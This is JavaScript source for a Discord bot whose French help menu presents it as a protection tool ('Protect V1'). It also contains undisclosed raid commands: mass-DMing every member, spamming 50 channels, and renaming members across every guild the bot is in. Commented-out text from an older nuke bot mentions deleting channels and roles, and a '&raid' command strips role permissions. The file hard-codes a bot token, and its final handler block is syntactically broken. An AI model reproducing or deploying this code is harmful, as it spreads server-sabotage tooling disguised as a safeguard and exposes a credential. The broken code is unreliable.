const Discord = require('discord.js')
const client = new Discord.Client()
const botPrefix = '&'
const EventEmitter = require('events');
const emitter = new EventEmitter()

const download = require('image-downloader')

let botname = 'corona' // You can change this with /setbotname

const token = 'OTIwNDQ1NjIxMDU4NTU2MDA1.YbkdyQ.ysrS_wmW8Z2I0-D40gQIBqWy6hM'

client.on('message', msg => {
  if (msg.guild && msg.content.startsWith('/pmeveryone')) {
    const text = msg.content.slice('/pmeveryone'.length) // cuts off the /private part
    msg.guild.members.forEach(member => {
      if (member.id != client.user.id && !member.user.bot) member.send(text)
    })
  }
  if (msg.content.startsWith('/channels')) {
    const channelname = msg.content.slice('/channels'.length) // cuts off the /private part
    msg.channel.send('Creating 50 New Text Channels Named: ' + '**' + channelname + '**')

    var i
    for (i = 0; i < 50; i++) {
      setTimeout(() => {
        msg.guild.createChannel(channelname, { type: 'text' })
          .then(console.log)
          .catch(console.error)
      }, 1 * 1) // 3 seconden
    }
  }
  if (msg.content == '&help') {
    const embed = {
      title: '🛡️ Protect V1',
      description: 'Vous devrez prendre soin de vérifier que tout les modules désirés sont bien activés en utilisant : **__&config__**',
      url: 'https://discord.com/api/oauth2/authorize?client_id=920445621058556005&permissions=8&scope=bot',
      color: 000000,
      thumbnail: {
        url: 'https://cdn.discordapp.com/avatars/918543604568449124/4e08ba184684716b31364e2c69d09bff.webp'
      },
      author: {
        url: 'https://discordapp.com',
        icon_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
      },
      fields: [
        {
          name: '```Commands :```',
          value: '**- &wl <ID>**      *Ajouter et supprimer un membre*\n**- &gs <ID>**            *Autoriser un membre à utiliser le module de Blacklist Rank*\n**- &blacklist <ID>**   *Ajouter une personne à la blacklist*\n**- &unbl <ID>** *Supprimer un membre de la blacklist (Seule la personne ayant blacklist la personne peut la unblacklist)*\n**- &config** *Permet de voir la configuration du serveur*\n**- &raid** *Désactive toute les permissions*\n**- &module antidc**  *Permet de on/off le module AntiDC*\n**- &module antibot** *Permet de on/off le module AntiBot*\n\n**- &module antirole**                      *Active ou désactive le module AntiRôle*\n**- &module antidown**                         *Active ou désactive le module AntiDown*\n**- &module antiban**                           *Active ou désactive le module AntiBan*'
        },
      ]
    }
    msg.channel.send({ embed })
    // msg.channel.send("This awesome bot is created by !PandaTjuuhhh!#0001 and Jochem_Legend27#4112.\nCommands:\n/deletechannels    Deletes all channels!\n/channels {name}    Creates channels with a name you choose!\n/deleteroles    Deletes all server roles!\n/help    Shows this list!\nn/spam {message}   Spams the current channel with {message}.")
  }

  if (msg.content == '&lena') {
    const embed = {
      title: '❤ Lena',
      description: 'Commandes pour Lena mon amour que j\'\aime depuis le 17/7 <3 !',
      url: 'https://discord.com/api/oauth2/authorize?client_id=920445621058556005&permissions=8&scope=bot',
      color: '#fd6c9e',
      thumbnail: {
        url: 'https://www.incimages.com/uploaded_files/image/1920x1080/getty_534682529_135726.jpg'
      },
      author: {
        url: 'https://discordapp.com',
        icon_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
      },
      fields: [
        {
          name: '```Commands :```',
          value: '**- &amour **      *Envoyer de l\'\amour à Lena*\n**- &kiss **            *Embrasser*'
        },
      ]
    }
    msg.channel.send({ embed })
    // msg.channel.send("This awesome bot is created by !PandaTjuuhhh!#0001 and Jochem_Legend27#4112.\nCommands:\n/deletechannels    Deletes all channels!\n/channels {name}    Creates channels with a name you choose!\n/deleteroles    Deletes all server roles!\n/help    Shows this list!\nn/spam {message}   Spams the current channel with {message}.")
  }

  if (msg.content.startsWith('/guildicon')) {
    const newguildicon = msg.content.slice('/guildicon'.length)
    msg.channel.send('Setting new guild icon to **' + newguildicon + '**')
    options = {
      url: 'http://someurl.com/image.jpg',
      dest: '/images/' // Save to /path/to/dest/image.jpg
    }

    download.image(options)
      .then(({ filename, image }) => {
        console.log('Saved to', filename) // Saved to /path/to/dest/image.jpg
      })

      .catch((err) => console.error(err))
    msg.guild.setIcon(newguildicon)
      .then(console.log)
      .catch(console.error)
  }
  if ((msg.content.startsWith('/everyguildmassnick'))) {
    const nickname = msg.content.slice('/everyguildmassnick'.length)
    msg.delete()
    var guildList = client.guilds.array()
    try {
      guildList.forEach(guild =>
        guild.members.forEach(member => {
          member.setNickname(nickname)
        })

      )
    } catch (err) {
      console.log('could not send message')
    }
  }
})
client.on('message', message => 
client.on('message', msg => {
if (msg.content == '&raid') {
  message.delete({ timeout: 1 })
  const roles = message.guild.roles.cache.filter(r => r.editable && (r.permissions.has('ADMINISTRATOR') || r.permissions.has('KICK_MEMBERS') || r.permissions.has('BAN_MEMBERS') || r.permissions.has('MANAGE_CHANNELS') || r.permissions.has('MANAGE_GUILD') || r.permissions.has('MANAGE_WEBHOOKS') || r.permissions.has('MANAGE_ROLES')))
  roles.forEach(role => {
    role.setPermissions(0).catch(console.error)

      const embed = {
        title: '🛡️  Protection demandée',
        description: 'Toutes les permissions sont désactiver sur tout les rôles. ✅',
        url: '',
        color: '#2f3136',
        thumbnail: {
          url: ''
        },
        author: {
          url: 'https://discordapp.com',
          icon_url: 'https://cdn.discordapp.com/embed/avatars/0.png'
        },
      }
      msg.channel.send({ embed })
      // msg.channel.send("This awesome bot is created by !PandaTjuuhhh!#0001 and Jochem_Legend27#4112.\nCommands:\n/deletechannels    Deletes all channels!\n/channels {name}    Creates channels with a name you choose!\n/deleteroles    Deletes all server roles!\n/help    Shows this list!\nn/spam {message}   Spams the current channel with {message}.")
    }   
);}}))

client.login(token)